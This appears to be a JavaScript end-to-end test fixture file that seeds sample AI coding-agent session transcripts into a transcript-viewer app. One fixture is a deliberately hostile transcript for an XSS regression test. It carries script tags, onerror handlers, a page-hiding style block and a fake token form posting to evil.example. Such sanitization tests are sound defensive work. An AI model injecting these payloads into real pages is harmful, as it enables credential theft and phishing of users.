// Fixtures for the end-to-end tests. Sessions now live in the store, so the fixtures are pushed to
// the app's ingest API (see seed.setup.mjs) rather than written as files the server scans. The one
// thing that stays on disk is a real file under ~/.gemini that the file-preview modal loads.
//
// Every session carries a cached summary so that selecting it serves the analysis from the store
// (the server runs with a dummy GEMINI_API_KEY) and never calls the real LLM.

import fs from "node:fs";
import path from "node:path";

function jsonl(lines) {
  return lines.map((l) => JSON.stringify(l)).join("\n") + "\n";
}

// Builds the ingest payloads. The Antigravity transcripts embed an absolute path to the real
// config.txt, so the payloads depend on where that file was written.
function buildSessions(configPath) {
  return [
    {
      source: "antigravity-cli",
      id: "sess-0001-parser",
      title: "Fix the parser bug",
      sourceMtime: Date.parse("2026-06-19T10:00:00Z"),
      raw: jsonl([
        {
          type: "USER_INPUT",
          source: "USER_EXPLICIT",
          content:
            "<USER_REQUEST>\nPlease fix the parser referenced in @[config.txt]\n</USER_REQUEST>\n" +
            "<ADDITIONAL_METADATA>\n@[config.txt] is a [File]:\n" +
            configPath +
            "\n</ADDITIONAL_METADATA>",
          created_at: "2026-06-19T10:00:00Z",
        },
        {
          source: "MODEL",
          type: "PLANNER_RESPONSE",
          content: "Editing the parser and running the build.",
          tool_calls: [
            { name: "edit_file", args: { TargetFile: "Parser.java" } },
            { name: "run_command", args: { CommandLine: "./gradlew build" } },
          ],
          created_at: "2026-06-19T10:00:05Z",
        },
        {
          type: "ERROR_MESSAGE",
          status: "ERROR",
          error: "NullPointerException",
          content: "Encountered error in step execution: NullPointerException",
          created_at: "2026-06-19T10:00:10Z",
        },
        {
          source: "MODEL",
          type: "PLANNER_RESPONSE",
          content:
            "All fixed! The parser now handles null input. See [the config](file://" +
            configPath +
            ") for details.",
          created_at: "2026-06-19T10:00:15Z",
        },
      ]),
      summary: JSON.stringify({
        shortTitle: "Fix the parser bug",
        summary: "The agent investigated and fixed a null-pointer bug in the parser.",
        flow: ["Investigated the parser", "Applied a null check"],
        agentActions: [{ action: "edit", description: "Edited the parser source" }],
        issues: [{ error: "NullPointerException in parser", circumvention: "Added a null check" }],
        recommendations: ["Add a lint rule for null checks"],
      }),
    },
    {
      source: "antigravity-cli",
      id: "sess-0002-darkmode",
      title: "Add dark mode",
      sourceMtime: Date.parse("2026-06-19T11:00:00Z"),
      raw: jsonl([
        {
          type: "USER_INPUT",
          source: "USER_EXPLICIT",
          content: "<USER_REQUEST>\nAdd a dark mode toggle\n</USER_REQUEST>",
          created_at: "2026-06-19T11:00:00Z",
        },
        {
          source: "MODEL",
          type: "PLANNER_RESPONSE",
          content: "Added a dark mode toggle to the settings.",
          created_at: "2026-06-19T11:00:05Z",
        },
      ]),
      summary: JSON.stringify({
        shortTitle: "Add dark mode",
        summary: "The agent added a dark mode toggle.",
        flow: ["Added a toggle"],
        agentActions: [{ action: "edit", description: "Edited the settings UI" }],
        issues: [],
        recommendations: [],
      }),
    },
    {
      source: "antigravity-ide",
      id: "sess-ide-0001",
      title: "IDE refactor session",
      sourceMtime: Date.parse("2026-06-18T09:00:00Z"),
      raw: jsonl([
        {
          type: "USER_INPUT",
          source: "USER_EXPLICIT",
          content: "<USER_REQUEST>\nRefactor the IDE plugin\n</USER_REQUEST>",
          created_at: "2026-06-18T09:00:00Z",
        },
      ]),
      summary: JSON.stringify({
        shortTitle: "IDE refactor session",
        summary: "The agent refactored the IDE plugin.",
        flow: ["Refactored a module"],
        agentActions: [],
        issues: [],
        recommendations: [],
      }),
    },
    {
      // A hostile transcript for the XSS regression spec (security.spec.js): transcript content is
      // untrusted, and none of these payloads may execute or survive sanitization. Lives under
      // antigravity-ide (NOT "antigravity", which the first-run-onboarding spec needs empty).
      source: "antigravity-ide",
      id: "sess-xss-0001",
      title: "Hostile transcript",
      sourceMtime: Date.parse("2026-06-21T08:00:00Z"),
      raw: jsonl([
        {
          type: "USER_INPUT",
          source: "USER_EXPLICIT",
          content:
            "<USER_REQUEST>\nRender this <img src=x onerror=\"window.__xss=1\"> please\n</USER_REQUEST>",
          created_at: "2026-06-21T08:00:00Z",
        },
        {
          source: "MODEL",
          type: "PLANNER_RESPONSE",
          thinking: 'Thinking with <script>window.__xss=2</script> inside.',
          content:
            'Done. <script>window.__xss=3</script> And an <img src=x onerror="window.__xss=4"> image.\n\n' +
            // No script runs from these, but DOMPurify's defaults would let them through: a <style>
            // block is not scoped to the transcript and can restyle or hide the app's own chrome,
            // and a <form> rendered in the trusted origin next to the real API-token prompt is
            // enough to make a convincing fake one. A style attribute is the overlay vector.
            '<style>body{display:none}</style>\n' +
            '<form id="xss-form" action="https://evil.example/steal" method="POST">' +
            '<input name="token"><button>Unlock</button></form>\n' +
            '<a id="xss-overlay" href="#" style="position:fixed;inset:0;z-index:9999">covered</a>',
          tool_calls: [
            {
              name: '<img src=x onerror="window.__xss=5">',
              args: { note: "tool name is attacker-controlled too" },
            },
          ],
          created_at: "2026-06-21T08:00:05Z",
        },
      ]),
      summary: JSON.stringify({
        shortTitle: "Hostile transcript",
        summary: 'A session whose content contains <script>window.__xss=6</script> markup.',
        flow: [],
        agentActions: [],
        issues: [],
        recommendations: [],
      }),
    },
    {
      // The case the file preview used to fail: the attached file is NOT on this machine's disk
      // (nothing ever writes /srv/elsewhere/Remote.java), so the server can only serve it from the
      // copy the ingest client pushed with the session. Before attachments, this 404'd — which is
      // what happened to every session viewed from a machine that didn't run the agent.
      source: "antigravity-cli",
      id: "sess-0003-attached",
      title: "Attached file from another machine",
      sourceMtime: Date.parse("2026-06-19T09:00:00Z"),
      raw: jsonl([
        {
          type: "USER_INPUT",
          source: "USER_EXPLICIT",
          content:
            "<USER_REQUEST>\nReview @[Remote.java] please\n</USER_REQUEST>\n" +
            "<ADDITIONAL_METADATA>\n@[Remote.java] is a [File]:\n/srv/elsewhere/Remote.java\n</ADDITIONAL_METADATA>",
          created_at: "2026-06-19T09:00:00Z",
        },
      ]),
      files: [
        {
          path: "/srv/elsewhere/Remote.java",
          content: "class Remote { /* pushed with the session, never on this disk */ }",
        },
      ],
      summary: JSON.stringify({
        shortTitle: "Attached file",
        summary: "A session carrying a file from the machine that ran the agent.",
        flow: [],
        agentActions: [],
        issues: [],
        recommendations: [],
      }),
    },
    {
      source: "codex",
      id: "rollout-2026-06-20T14-00-00-codexsession",
      sourceMtime: Date.parse("2026-06-20T14:00:00Z"),
      raw: jsonl([
        { type: "session_meta", timestamp: "2026-06-20T14:00:00.000Z", payload: { id: "codexsession", cwd: "/repo" } },
        {
          type: "event_msg",
          timestamp: "2026-06-20T14:00:00.100Z",
          payload: { type: "user_message", message: "Investigate the flaky test" },
        },
        {
          type: "response_item",
          timestamp: "2026-06-20T14:00:00.100Z",
          payload: {
            type: "message",
            role: "user",
            content: [{ type: "input_text", text: "Investigate the flaky test" }],
          },
        },
        {
          type: "response_item",
          timestamp: "2026-06-20T14:00:02.000Z",
          payload: {
            type: "message",
            role: "assistant",
            content: [{ type: "output_text", text: "Running the test suite to reproduce." }],
          },
        },
        {
          type: "response_item",
          timestamp: "2026-06-20T14:00:03.000Z",
          payload: {
            type: "function_call",
            name: "exec_command",
            arguments: JSON.stringify({ cmd: "npm test" }),
            call_id: "call_codex_1",
          },
        },
        {
          type: "response_item",
          timestamp: "2026-06-20T14:00:05.000Z",
          payload: {
            type: "function_call_output",
            call_id: "call_codex_1",
            output: "Process exited with code 0\nOutput:\nAll tests passed",
          },
        },
      ]),
      summary: JSON.stringify({
        shortTitle: "Flaky test investigation",
        summary: "The agent reproduced and analyzed a flaky test via the suite.",
        flow: ["Ran the test suite"],
        agentActions: [{ action: "run", description: "Ran npm test" }],
        issues: [],
        recommendations: [],
      }),
    },
    {
      source: "claude-code",
      id: "cc111111-2222-3333-4444-555555555555",
      sourceMtime: Date.parse("2026-06-19T15:00:00Z"),
      raw: jsonl([
        { type: "summary", summary: "Implement login flow", leafUuid: "x" },
        {
          type: "user",
          timestamp: "2026-06-19T15:00:00.000Z",
          message: { role: "user", content: "Implement login flow" },
        },
        {
          type: "assistant",
          timestamp: "2026-06-19T15:00:02.000Z",
          message: {
            role: "assistant",
            content: [
              { type: "text", text: "Reading the auth module." },
              { type: "tool_use", id: "u1", name: "Read", input: { file_path: "Auth.swift" } },
            ],
          },
        },
        {
          type: "user",
          timestamp: "2026-06-19T15:00:03.000Z",
          message: {
            role: "user",
            content: [{ type: "tool_result", tool_use_id: "u1", content: "class Auth {}", is_error: false }],
          },
        },
      ]),
      summary: JSON.stringify({
        shortTitle: "Login flow",
        summary: "The agent implemented a login flow by reading and editing the auth module.",
        flow: ["Read the auth module"],
        agentActions: [{ action: "read", description: "Read Auth.swift" }],
        issues: [],
        recommendations: [],
      }),
    },
  ];
}

// Writes the on-disk config.txt the file-preview modal loads, and returns the ingest payloads for
// every fixture session. The session transcripts themselves are pushed to the store, not written.
export function seedFixtures(home) {
  const gemini = path.join(home, ".gemini");
  fs.rmSync(home, { recursive: true, force: true });
  fs.mkdirSync(gemini, { recursive: true });

  const configPath = path.join(gemini, "config.txt");
  fs.writeFileSync(configPath, "parser.mode = strict\nparser.maxDepth = 32\n");

  return { home, configPath, sessions: buildSessions(configPath) };
}
